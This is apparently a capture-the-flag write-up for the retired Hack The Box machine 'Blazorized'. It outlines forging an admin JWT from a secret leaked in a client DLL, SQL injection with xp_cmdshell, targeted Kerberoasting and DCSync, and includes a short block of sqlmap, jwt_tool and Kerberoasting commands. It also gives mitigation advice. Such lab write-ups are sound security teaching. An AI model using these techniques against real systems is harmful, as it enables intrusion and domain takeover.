---
machine: Blazorized
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, blazor, jwt, sqli, kerberoasting, dcsync]
---

# Blazorized — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A Blazor WebAssembly DLL leaks the JWT signing secret; forge an administrator token and exploit SQLi with `xp_cmdshell`. Then `WriteSPN` enables targeted Kerberoasting and the ACL chain leads to DCSync.

## Reconnaissance

```bash
nmap -Pn -sCV -p80,445,3389,5985 <IP>
wget -q http://blazorized.htb/_framework/Blazorized.Client.dll -O client.dll
strings -el client.dll | grep -iE "secret|key|jwt"
python3 jwt_tool.py <TOKEN> -S hs256 -p "<SECRET>"
sqlmap --url "http://blazorized.htb/api/..." --os-shell
# AD
bloodhound-python -u <USER> -p "<PASS>" -d blazorized.htb -c All
targetedKerberoast.py -d blazorized.htb -u <USER> -p "<PASS>"
```

## Enumeration

- Blazor application with downloadable DLLs and an admin panel.
- JWT using HMAC and a secret embedded in the client.
- SQL Server reachable from the panel and AD users with a writable SPN.

## Initial access

Download `Blazorized.Client.dll` and search for key-like strings. Sign a JWT with the administrator role using the secret; the panel allows SQLi and `xp_cmdshell` gives a host shell.

## Privilege escalation

BloodHound shows `WriteSPN` on an account. Write an SPN, perform targeted Kerberoasting, crack the hash and obtain another user. A modifiable startup script and replication rights enable DCSync.

## Evidence

- JWT secret recovered from the DLL.
- Admin token accepted by the API.
- SQLi query and `whoami` through `xp_cmdshell`.

## Lessons learned

- The signing secret must never reach the client.
- A writable SPN turns an account into a Kerberoasting target.
- Chained ACLs allow escalation without memory exploits.

## Mitigation and detection

- Validate JWT server-side and rotate the secret.
- Restrict `WriteSPN` and use managed service accounts.
- Audit startup scripts and replication permissions.

## References

- [0xdf — Blazorized](https://0xdf.gitlab.io/2024/11/09/htb-blazorized.html)
- [Microsoft — JWT validation](https://learn.microsoft.com/en-us/entra/identity-platform/security-tokens)
- [Hack The Box — Blazorized](https://app.hackthebox.com/machines/blazorized)
